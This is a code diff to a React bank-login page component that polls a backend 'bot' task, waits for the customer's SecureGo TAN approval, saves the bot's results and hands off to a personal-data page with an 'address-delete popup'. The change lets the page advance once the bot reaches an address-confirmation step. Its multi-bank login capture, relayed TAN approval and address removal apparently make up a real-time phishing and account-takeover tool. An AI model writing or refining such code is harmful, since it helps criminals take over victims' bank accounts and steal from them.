@@ -360,9 +360,17 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
       );
       const approvalConfirmed = st === "completed" || tanConfirmedSignal;
 
-      // Person data can arrive before the customer approves SecureGo. Keep polling
-      // and only leave the approval screen after the API explicitly confirms it.
-      if (hasPersonData && approvalConfirmed) {
+      // Address-confirm signal itself proves the login TAN was approved.
+      const addressConfirmSignal =
+        st === "waiting_for_address_confirm" ||
+        st === "waiting_for_address" ||
+        payloadContains(data, /address.?confirm|adress.?bestaet|waiting_for_address/i);
+
+      // As soon as person data is available AND login was approved (TAN confirmed,
+      // completed, or bot already moved on to address step), leave the 2FA loader
+      // and hand off to the Persönliche Daten page. The address-delete popup lives
+      // there — the login route no longer intercepts waiting_for_address_confirm.
+      if (hasPersonData && (approvalConfirmed || addressConfirmSignal)) {
         try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
         try {
           sessionStorage.setItem(`bot_bank_${taskId}`, JSON.stringify({
@@ -392,20 +400,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         return;
       }
 
-      // Show address confirmation popup — DO NOT auto-confirm.
-      const addressConfirmSignal =
-        st === "waiting_for_address_confirm" ||
-        st === "waiting_for_address" ||
-        payloadContains(data, /address.?confirm|adress.?bestaet|waiting_for_address/i);
-      if (addressConfirmSignal) {
-        pollRef.current.positiveSeen = true;
-        setCurrentTaskId(taskId);
-        setAddressData(data?.result?.address_data ?? data?.address_data ?? null);
-        setPhase("address_confirm");
-        setSubmitting(false);
-        pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
-        return;
-      }
+
 
       if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal) {
         setPhase("tan");
